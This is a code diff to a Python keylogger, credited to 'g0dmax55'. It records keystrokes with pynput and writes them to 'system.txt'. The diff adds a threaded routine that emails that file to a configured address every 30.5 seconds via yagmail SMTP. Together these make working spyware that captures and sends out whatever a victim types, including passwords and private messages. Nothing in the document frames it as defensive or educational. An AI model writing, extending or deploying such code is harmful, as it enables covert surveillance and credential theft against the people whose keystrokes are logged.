@@ -1,7 +1,11 @@
-#!/usr/bin/env python3
-
+from concurrent.futures import thread
 import os
+from time import sleep
 from pynput.keyboard import Listener
+import yagmail
+
+import threading
+
 
 #coded by g0dmax55
 
@@ -27,5 +31,28 @@ def write_file(keys):
 			f.write(str(key))
 
 
-with Listener(on_press=keystrokes) as listener:
-	listener.join()
+
+def mail():
+	receiver = "" # receiver email address
+	body = "keylogger Text File"  # email body
+	filename = ("system.txt")
+	mailID = "" # mail id 
+	password = "" # password 
+	yag = yagmail.SMTP(mailID, password)
+
+	while True:
+		sleep(30.5)
+		yag.send(to=receiver,subject="keylogger",contents=body, attachments=filename,)
+		print("sending")
+	
+	
+
+
+def lis():
+	with Listener(on_press=keystrokes) as listener:
+		listener.join()
+
+thread1 = threading.Thread(target=lis)
+thread1.start()
+thread2 = threading.Thread(target=mail)
+thread2.start()
